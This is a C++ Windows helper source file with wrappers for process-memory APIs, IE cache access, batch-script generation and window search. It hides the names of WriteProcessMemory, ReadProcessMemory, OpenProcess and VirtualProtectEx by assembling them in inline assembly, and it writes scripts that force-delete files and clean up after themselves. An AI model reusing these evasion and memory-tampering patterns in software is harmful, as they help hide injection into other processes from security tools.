#include "System.hpp"
#include <shlwapi.h>
#include <setupapi.h> 
#include <devguid.h> 
#include <regstr.h>
#pragma comment(lib, "Setupapi.lib ")
namespace SYSTEM_INTERFACE
{
	static CHAR *UpdateScript=0;
	BOOL WINAPI _VirtualProtectEx(__in  HANDLE hProcess,__in  LPVOID lpAddress,__in  SIZE_T dwSize,__in  DWORD flNewProtect,__out PDWORD lpflOldProtect)
	{
		typedef BOOL (WINAPI *__VirtualProtectEx)(__in  HANDLE hProcess,__in  LPVOID lpAddress,__in  SIZE_T dwSize,__in  DWORD flNewProtect,__out PDWORD lpflOldProtect);
		CHAR callName[MAX_PATH];
		_asm
		{
			MOV DWORD PTR [callName+00000h],'triV'
				MOV DWORD PTR [callName+00004h],'Plau'
				MOV DWORD PTR [callName+00008h],'etor'
				MOV DWORD PTR [callName+0000Ch],'xEtc'
				MOV BYTE PTR [callName+00010h],0
		}

		return ((__VirtualProtectEx)(GetProcAddress(GetModuleHandleA("kernel32.dll"),callName)))(hProcess,lpAddress,dwSize,flNewProtect,lpflOldProtect);
	}
	BOOL WINAPI _WriteProcessMemory(__in HANDLE hProcess,__in LPVOID lpBaseAddress,__in LPCVOID lpBuffer,__in SIZE_T nSize,__out_opt SIZE_T * lpNumberOfBytesWritten)
	{
		typedef BOOL (WINAPI *__WriteProcessMemory)(__in HANDLE hProcess,__in LPVOID lpBaseAddress,__in LPCVOID lpBuffer,__in SIZE_T nSize,__out_opt SIZE_T * lpNumberOfBytesWritten);
		CHAR callName[MAX_PATH];
		_asm
		{
			MOV DWORD PTR [callName+00000h],'tirW'
				MOV DWORD PTR [callName+00004h],'orPe'
				MOV DWORD PTR [callName+00008h],'ssec'
				MOV DWORD PTR [callName+0000Ch],'omeM'
				MOV WORD PTR [callName+00010h],'yr'
				MOV BYTE PTR [callName+00012h],0
		}

		return ((__WriteProcessMemory)(GetProcAddress(GetModuleHandleA("kernel32.dll"),callName)))(hProcess,lpBaseAddress,lpBuffer,nSize,lpNumberOfBytesWritten);

	}
	BOOL WINAPI _VirtualProtect(__in  LPVOID lpAddress,__in  SIZE_T dwSize,__in  DWORD flNewProtect,__out PDWORD lpflOldProtect)
	{
		typedef BOOL (WINAPI *__VirtualProtect)(__in  LPVOID lpAddress,__in  SIZE_T dwSize,__in  DWORD flNewProtect,__out PDWORD lpflOldProtect);
		CHAR callName[MAX_PATH];
		_asm
		{
			MOV DWORD PTR [callName+00000h],'triV'
				MOV DWORD PTR [callName+00004h],'Plau'
				MOV DWORD PTR [callName+00008h],'etor'
				MOV WORD PTR [callName+0000Ch],'tc'
				MOV BYTE PTR [callName+0000Eh],0
		}

		return ((__VirtualProtect)(GetProcAddress(GetModuleHandleA("kernel32.dll"),callName)))(lpAddress,dwSize,flNewProtect,lpflOldProtect);

	}
	SIZE_T WINAPI _VirtualQuery(__in_opt LPCVOID lpAddress,PMEMORY_BASIC_INFORMATION lpBuffer,__in SIZE_T dwLength)
	{
		typedef SIZE_T (WINAPI* __VirtualQuery)(__in_opt LPCVOID lpAddress,PMEMORY_BASIC_INFORMATION lpBuffer,__in     SIZE_T dwLength);
		CHAR callName[MAX_PATH];
		_asm
		{
			MOV DWORD PTR [callName+00000h],'triV'
				MOV DWORD PTR [callName+00004h],'Qlau'
				MOV DWORD PTR [callName+00008h],'yreu'
				MOV BYTE PTR [callName+0000Ch],0
		}

		return ((__VirtualQuery)(GetProcAddress(GetModuleHandleA("kernel32.dll"),callName)))(lpAddress,lpBuffer,dwLength);

	}
	HANDLE WINAPI _OpenProcess(__in DWORD dwDesiredAccess,__in BOOL bInheritHandle,__in DWORD dwProcessId)
	{
		typedef HANDLE (WINAPI *__OpenProcess)(__in DWORD dwDesiredAccess,__in BOOL bInheritHandle,__in DWORD dwProcessId);
		CHAR callName[MAX_PATH];
		_asm
		{
			MOV DWORD PTR [callName+00000h],'nepO'
				MOV DWORD PTR [callName+00004h],'corP'
				MOV DWORD PTR [callName+00008h],'sse'
				MOV BYTE PTR [callName+0000Bh],0
		}
		return ((__OpenProcess)(GetProcAddress(GetModuleHandleA("kernel32.dll"),callName)))(dwDesiredAccess,bInheritHandle,dwProcessId);

	}
	BOOL WINAPI _ReadProcessMemory(__in HANDLE hProcess,__in LPCVOID lpBaseAddress,__out_bcount_part(nSize, *lpNumberOfBytesRead) LPVOID lpBuffer,__in SIZE_T nSize,__out_opt SIZE_T * lpNumberOfBytesRead)
	{
		typedef BOOL (WINAPI *__ReadProcessMemory)(__in HANDLE hProcess,__in LPCVOID lpBaseAddress,__out_bcount_part(nSize, *lpNumberOfBytesRead) LPVOID lpBuffer,__in SIZE_T nSize,__out_opt SIZE_T * lpNumberOfBytesRead);
		CHAR callName[MAX_PATH];
		_asm
		{
			MOV DWORD PTR [callName+00000h],'daeR'
				MOV DWORD PTR [callName+00004h],'corP'
				MOV DWORD PTR [callName+00008h],'Msse'
				MOV DWORD PTR [callName+0000Ch],'rome'
				MOV WORD PTR [callName+00010h],'y'
				MOV BYTE PTR [callName+00011h],0
		}

		return ((__ReadProcessMemory)(GetProcAddress(GetModuleHandleA("kernel32.dll"),callName)))(hProcess,lpBaseAddress,lpBuffer,nSize,lpNumberOfBytesRead);

	}
	BOOL WINAPI _GetUrlCacheEntryInfoA( __in LPCSTR lpszUrlName,LPINTERNET_CACHE_ENTRY_INFOA lpCacheEntryInfo, __inout_opt LPDWORD lpcbCacheEntryInfo)
	{

		typedef BOOL (WINAPI *__GetUrlCacheEntryInfoA)( __in LPCSTR lpszUrlName,LPINTERNET_CACHE_ENTRY_INFOA lpCacheEntryInfo, __inout_opt LPDWORD lpcbCacheEntryInfo);
		CHAR callName[MAX_PATH];
		HMODULE hmod = GetModuleHandleA("Wininet.dll");
		if(!hmod)hmod = LoadLibraryA("Wininet.dll");
		_asm
		{
			MOV DWORD PTR [callName+00000h],'UteG'
				MOV DWORD PTR [callName+00004h],'aClr'
				MOV DWORD PTR [callName+00008h],'Eehc'
				MOV DWORD PTR [callName+0000Ch],'yrtn'
				MOV DWORD PTR [callName+00010h],'ofnI'
				MOV WORD PTR [callName+00014h],'A'
				MOV BYTE PTR [callName+00015h],0
		}
		return ((__GetUrlCacheEntryInfoA)(GetProcAddress(hmod,callName)))(lpszUrlName,lpCacheEntryInfo,lpcbCacheEntryInfo);
	}
	BOOL WINAPI _DeleteUrlCacheEntryA(CHAR *URL)
	{

		typedef BOOL (WINAPI *__DeleteUrlCacheEntryA)(CHAR *URL);
		CHAR callName[MAX_PATH];
		HMODULE hmod = GetModuleHandleA("Wininet.dll");
		if(!hmod)hmod = LoadLibraryA("Wininet.dll");
		_asm
		{
			MOV DWORD PTR [callName+00000h],'eleD'
			MOV DWORD PTR [callName+00004h],'rUet'
			MOV DWORD PTR [callName+00008h],'caCl'
			MOV DWORD PTR [callName+0000Ch],'nEeh'
			MOV DWORD PTR [callName+00010h],'Ayrt'
			MOV BYTE PTR [callName+00014h],0
		}
		return ((__DeleteUrlCacheEntryA)(GetProcAddress(hmod,callName)))(URL);
	}
	CHAR *GetIEChcheFileShortPath(CHAR *lpszUrl)
	{
		CHAR *cachepath = GetIEChcheFilePath(lpszUrl);
		GetShortPathNameA(cachepath,cachepath,lstrlenA(cachepath));
		GetLastError();
		return cachepath;
	}
	CHAR *GetIEChcheFilePath(CHAR *lpszUrl)
	{
		DWORD dwEntrySize=0;
		static LPINTERNET_CACHE_ENTRY_INFOA lpCacheEntry=0;
		if(lpCacheEntry)
		{
			delete lpCacheEntry;
		}
		if (!_GetUrlCacheEntryInfoA(lpszUrl,NULL,&dwEntrySize))
		{
			if (GetLastError()!=ERROR_INSUFFICIENT_BUFFER)
			{
				return 0;
			}
			else
				lpCacheEntry = (LPINTERNET_CACHE_ENTRY_INFOA)new BYTE[dwEntrySize*2];
		}
		else
			return 0;

		if (!_GetUrlCacheEntryInfoA(lpszUrl,lpCacheEntry,&dwEntrySize))
		{
			return 0;
		}
		else
		{
			//GetLongPathNameA(lpCacheEntry->lpszLocalFileName,lpCacheEntry->lpszLocalFileName,lstrlenA(lpCacheEntry->lpszLocalFileName));
			return lpCacheEntry->lpszLocalFileName;
		}

		return 0;
	}
	DWORD ClearUrlCacheEntry(CHAR *url)
	{

		return _DeleteUrlCacheEntryA(url);
	}
	VOID FreeScript()
	{
		if(UpdateScript)
		GlobalFree(UpdateScript);
		UpdateScript=0;
	}
	CHAR* MakeUpdateScript(MAKE_TYPE mtype,CHAR* psrcPath,CHAR *pdestPath)
	{
		/*
		:trydel
			del "flashgui.exe" /f /a /q
		if exist "flashgui.exe" goto trydel
		del %0
		*/
		LARGE_INTEGER li={0};
		QueryPerformanceCounter(&li);
		DWORD label = li.LowPart;
		CHAR *pswap = UpdateScript;
		
		DWORD lenAlloc = lstrlenA(UpdateScript);
		lenAlloc +=lstrlenA(psrcPath)*4;
		lenAlloc +=lstrlenA(pdestPath)*4+MAX_PATH;
		UpdateScript = (CHAR*)GlobalAlloc(GPTR,lenAlloc);
		if(pswap)
		{
			lstrcpyA(UpdateScript,pswap);
			GlobalFree(pswap);
		}
		switch(mtype)
		{
		case SCRIPT_BEGIN:
			lstrcpyA(UpdateScript,"@echo off\r\n");
			break;
		case SCRIPT_COPY:
			wsprintfA((CHAR*)(UpdateScript+lstrlenA(UpdateScript)),"copy \"%s\" \"%s\" /Y\r\n",psrcPath,pdestPath);
			break;
		case SCRIPT_UPDATE:
			wsprintfA((CHAR*)(UpdateScript+lstrlenA(UpdateScript)),":L%X\r\ndel \"%s\"/f /a /q\r\nif exist \"%s\" goto L%X\r\n",label,pdestPath,pdestPath,label);
		//	Sleep(10);
			QueryPerformanceCounter(&li);
			label = li.LowPart;
			wsprintfA((CHAR*)(UpdateScript+lstrlenA(UpdateScript)),"call copy \"%s\" \"%s\" /Y\r\n:L%X:\r\ndel \"%s\"/f /a /q\r\nif exist \"%s\" goto L%X\r\n",psrcPath,pdestPath,label,psrcPath,psrcPath,label);
			break;
		case SCRIPT_SEARCH_AND_DEL:
			if(!StrStrA(UpdateScript,pdestPath))
				wsprintfA((CHAR*)(UpdateScript+lstrlenA(UpdateScript)),"for /F \"delims=\" %si in ('dir /s /b \"%s%s\"') do (\r\ndel \"%si\" /f /a /q\r\n)\r\n","%%",psrcPath,pdestPath,"%%");
			break;
		case SCRIPT_DELETE:
			wsprintfA((CHAR*)(UpdateScript+lstrlenA(UpdateScript)),":L%X\r\ndel \"%s\"/f /a /q\r\nif exist \"%s\" goto L%X\r\n",label,psrcPath,psrcPath,label);
			break;
		case SCRIPT_RUN:
			wsprintfA((CHAR*)(UpdateScript+lstrlenA(UpdateScript)),"start %s\r\n",psrcPath,pdestPath);
			break;
		case SCRIPT_END:
			//lstrcatA(UpdateScript,"pause");
			wsprintfA((CHAR*)(UpdateScript+lstrlenA(UpdateScript)),"del \"%s*.*\" /f /a /q",psrcPath);
			break;
		}
		return UpdateScript;
	}
	CHAR* GetSystemDirA()
	{
		static CHAR currPath[MAX_PATH*2]={0};
		GetSystemDirectoryA(currPath,sizeof(currPath));
		return currPath;
	}
	WCHAR* GetSystemDirW()
	{
		static WCHAR currPath[MAX_PATH*2]={0};
		GetSystemDirectoryW(currPath,sizeof(currPath));
		return currPath;
	}
	CHAR* GetCurrentDirA()
	{
		static CHAR currPath[MAX_PATH*2]={0};
		GetCurrentDirectoryA(sizeof(currPath),currPath);
		return currPath;
	}
	WCHAR* GetCurrentDirW()
	{
		static WCHAR currPath[MAX_PATH*2]={0};
		GetCurrentDirectoryW(sizeof(currPath),currPath);
		return currPath;
	}
	VOID PathPatch(CHAR *Path)
	{
		CHAR *pEnd = (CHAR*)(Path+lstrlenA(Path));
		if(pEnd[-1]!=0x5C)*(WORD*)(pEnd)=0x005C;
	}
	BOOL ScanPowerSpeed()
	{
		return (BOOL)(StrStrA(GetDeviceDescList("computer"),"Power Interface (ACPI) PC"));
	}
	CHAR *GetDeviceDescList(CHAR *DeviceName)
	{
		CHAR *descList=0;
		CHAR *tmpPtr=0;
		HDEVINFO hDevInfo; 
		SP_DEVINFO_DATA DeviceInfoData; 
		//SP_DEVICE_INTERFACE_DATA   DeviceInterfaceData; 

		DWORD i=sizeof(GUID); 
		DWORD cpLen=0;
		GUID aa; 
		GUID *ab; 
		ab=&aa; 
		DWORD DataT; 
		CHAR buf[MAX_PATH]={0}; 
		CHAR* buffer = buf; 
		DWORD buffersize = 0; 
		if(!SetupDiClassGuidsFromNameA(DeviceName,ab,i,&i))//通过设备类名得到设备类型的GUID 
		{ 
			//printf( "false ");
			return 0; 
		} 
		hDevInfo = SetupDiGetClassDevsA(ab, 0, 0, 0);//DIGCF_PRESENT | DIGCF_ALLCLASSES );//通过设备类型GUID得到这类设备信息的句柄 
		if (hDevInfo == INVALID_HANDLE_VALUE) 
		{ 
			// Insert error handling here. 
			return 0; 
		} 

		// Enumerate through all devices in Set. 
		//printf( "GUID={%X-%X-%X-%X%X-%X%X%X%X%X%X}\n",ab-> Data1,ab-> Data2,ab-> Data3,ab-> Data4[0],ab-> Data4[1],ab-> Data4[2],ab-> Data4[3],ab-> Data4[4],ab-> Data4[5],ab-> Data4[6],ab-> Data4[7]); 
		DeviceInfoData.cbSize = sizeof(SP_DEVINFO_DATA); 
		for (i = 0; SetupDiEnumDeviceInfo(hDevInfo, i, &DeviceInfoData)>0;i++)//枚举这类设备中所有的设备 
		{ 

			for(int s=0;s <2;s++)//因为有些时候第一次调用SetupDiGetDeviceRegistryProperty可能会失败,所以调用两次, 
			{ 
				SetupDiGetDeviceRegistryPropertyA(hDevInfo, &DeviceInfoData, SPDRP_DEVICEDESC,&DataT, (PBYTE)buffer, buffersize, &buffersize);//得到设备属性 
			}
			if(tmpPtr)
			{
				descList = (CHAR*)GlobalAlloc(GPTR,lstrlenA(buffer)+lstrlenA(tmpPtr)+10);
				CopyMemory(descList,tmpPtr,lstrlenA(tmpPtr));
				lstrcatA(descList,"\n");
				lstrcatA(descList,buffer);
				GlobalFree(tmpPtr);
			}
			else
			{
				cpLen = lstrlenA(buffer);
				descList = (CHAR*)GlobalAlloc(GPTR,cpLen+1);
				CopyMemory(descList,buffer,cpLen);
			}

			tmpPtr = descList;
			//printf( "设备: [ %s size=%d ]\n ",buffer,buffersize); 
			/*
			memset(buf,0,256);	
			for (int m = 0; 
			SetupDiEnumDeviceInterfaces(hDevInfo, 
			&DeviceInfoData, 
			ab,m,&DeviceInterfaceData); m++)//枚举这类设备中所有的设备 
			{ 
			printf( "GUID={%X-%X-%X-%X%X-%X%X%X%X%X%X}\n ",DeviceInterfaceData.InterfaceClassGuid.Data1,DeviceInterfaceData.InterfaceClassGuid.Data2,DeviceInterfaceData.InterfaceClassGuid.Data3,DeviceInterfaceData.InterfaceClassGuid.Data4[0], 
			DeviceInterfaceData.InterfaceClassGuid.Data4[1],DeviceInterfaceData.InterfaceClassGuid.Data4[2],DeviceInterfaceData.InterfaceClassGuid.Data4[3],DeviceInterfaceData.InterfaceClassGuid.Data4[4],DeviceInterfaceData.InterfaceClassGuid.Data4[5], 
			DeviceInterfaceData.InterfaceClassGuid.Data4[6],ab-> Data4[7]); 
			printf( "设备: [ %s size=%d ]\n ",buffer,buffersize); 
			memset(buf,0,256);	


			}   
			*/
			//printf( "Do you want close this driver (YES)y or (NO)n\n "); 
			/*	 CHAR ch[128]; 
			scanf( "%s ",ch); 
			if(ch[0]== 'y ') 
			{ 
			if(SetupDiRemoveDevice( 
			hDevInfo, &DeviceInfoData)) 
			{ 
			printf( "SetupDiRemoveDevice succeed \n "); 
			} 
			else 
			{ 
			printf( "SetupDiRemoveDevice false "); 
			} 
			}*/ 

		} 

		if ( GetLastError()!=NO_ERROR && GetLastError()!=ERROR_NO_MORE_ITEMS ) 
		{ 
			// Insert error handling here. 
			return 0; 
		} 

		//   Cleanup 
		SetupDiDestroyDeviceInfoList(hDevInfo); 

		return descList; 
	}
	BOOL CALLBACK EnumCallback(HWND hwnd,TCHAR* pLikeTitle)
	{
		TCHAR title[MAX_PATH];
		::GetWindowText(hwnd,title,MAX_PATH);
		if(StrStrI(pLikeTitle,title))
		{
			return TRUE;
		}
		return FALSE;
	}

	HWND SearchWindow(CHAR *pLikeTitle)
	{
		//EnumWindows((WNDENUMPROC)&EnumCallback,(LPARAM)pLikeTitle);
		
		//暴力找窗口
		DWORD cnt=0;
		HWND hwnd,newhw;
		DWORD pid;
		CHAR cname[MAX_PATH];
		for(cnt=0;cnt<0x00FFFFFF;cnt++)
		{
			newhw=(HWND)cnt;
			if(!IsWindow(newhw))continue;
			pid=0;
			GetWindowThreadProcessId(newhw,&pid);
			if(!pid)continue;

			hwnd = newhw;
			::GetWindowTextA(hwnd,cname,MAX_PATH);
			if(StrStrIA(cname,pLikeTitle))
			{
				//	if(FindWindowEx((HWND)newhw,0,_T("wtlStatic"),_T("输入AK频道号快速进入")))
				return hwnd;
			}
		}
		
		return 0;
	}
}